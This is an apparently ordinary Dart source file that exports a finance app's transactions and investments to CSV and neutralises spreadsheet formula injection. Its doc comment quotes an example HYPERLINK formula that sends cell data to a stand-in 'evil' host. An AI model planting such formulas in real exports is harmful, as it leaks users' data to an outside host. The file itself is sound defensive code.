/// CSV downloads of the transactions and investments.
library;

import 'dart:io';

import 'package:csv/csv.dart';

import '../../models/expense.dart';
import '../../utils/currency_format.dart';
import '../db_service.dart';
import 'local_files.dart';

/// Neutralises spreadsheet formula injection in an exported cell.
///
/// Excel and LibreOffice evaluate any cell whose text begins with `=`, `+`,
/// `-`, `@`, a tab, or a carriage return. A transaction described
/// `=HYPERLINK("http://evil/"&A1,"click")` would therefore execute when the
/// export is opened. Prefixing with an apostrophe forces the spreadsheet to
/// treat the value as literal text; the apostrophe itself is not displayed.
///
/// Only [String] cells are at risk — numbers and dates are emitted by the
/// caller as their own types and pass through untouched.
Object? csvSafeCell(Object? value) {
  if (value is! String || value.isEmpty) return value;
  return RegExp(r'^[=+\-@\t\r]').hasMatch(value) ? "'$value" : value;
}

List<List<dynamic>> _expenseCsvRows(
        List<Expense> expenses, Map<int, String> accountNames) =>
    [
      [
        'ID',
        'Description',
        'Amount',
        'Date',
        'Category',
        'PaymentMode',
        'Type',
        'AccountId',
        'ToAccountId',
        'ToAmount',
        // Names alongside the ids, which mean nothing outside the app.
        'Account',
        'ToAccount',
        // Last, so the columns before it keep their positions.
        'Note',
      ],
      ...expenses.map((e) => [
            e.id ?? '',
            csvSafeCell(e.description),
            // Export human-readable major units (e.g. 120.50).
            minorToMajor(e.amount).toStringAsFixed(2),
            e.date.toIso8601String(),
            csvSafeCell(e.category),
            csvSafeCell(e.paymentMode),
            e.type,
            e.accountId ?? '',
            e.toAccountId ?? '',
            // Destination-currency amount of a cross-currency transfer.
            e.toAmount == null
                ? ''
                : minorToMajor(e.toAmount!).toStringAsFixed(2),
            csvSafeCell(accountNames[e.accountId] ?? ''),
            csvSafeCell(accountNames[e.toAccountId] ?? ''),
            csvSafeCell(e.noteText ?? ''),
          ]),
    ];

/// Writes the given expenses to a CSV file and returns it. Callers pass an
/// already-filtered list (e.g. the current month) so users can download
/// exactly what they see.
Future<File> writeExpensesCsvFile(List<Expense> expenses,
    {String filename = 'expenses_export.csv'}) async {
  final csvData = csv.encode(_expenseCsvRows(expenses, await _accountNames()));
  final file = File('${await documentsPath()}/$filename');
  await file.writeAsString(csvData);
  return file;
}

/// Every transaction, or with [from] and [to] only those dated from [from]
/// up to but not including [to].
Future<File> exportExpensesToCsv({DateTime? from, DateTime? to}) async {
  final expenses = from != null && to != null
      ? await DBService().getExpensesByDateRange(from, to)
      : await DBService().getExpenses();
  return writeExpensesCsvFile(expenses);
}

/// Account names by id, for the export's readable account columns.
Future<Map<int, String>> _accountNames() async => {
      for (final a in await DBService().getAccounts()) a.id!: a.name,
    };

/// Every investment entry, or with [from] and [to] only those dated from
/// [from] up to but not including [to].
Future<File> exportInvestmentsToCsv({DateTime? from, DateTime? to}) async {
  final investments = [
    for (final i in await DBService().getInvestments())
      if (from == null ||
          to == null ||
          (!i.date.isBefore(from) && i.date.isBefore(to)))
        i,
  ];
  final accountNames = await _accountNames();
  final List<List<dynamic>> rows = [
    ['ID', 'Name', 'Amount', 'Date', 'Type', 'PaidFrom'],
    ...investments.map((i) => [
          i.id ?? '',
          csvSafeCell(i.name),
          minorToMajor(i.amount).toStringAsFixed(2),
          i.date.toIso8601String(),
          csvSafeCell(i.type),
          csvSafeCell(accountNames[i.accountId] ?? ''),
        ]),
  ];
  final file = File('${await documentsPath()}/investments_export.csv');
  await file.writeAsString(csv.encode(rows));
  return file;
}
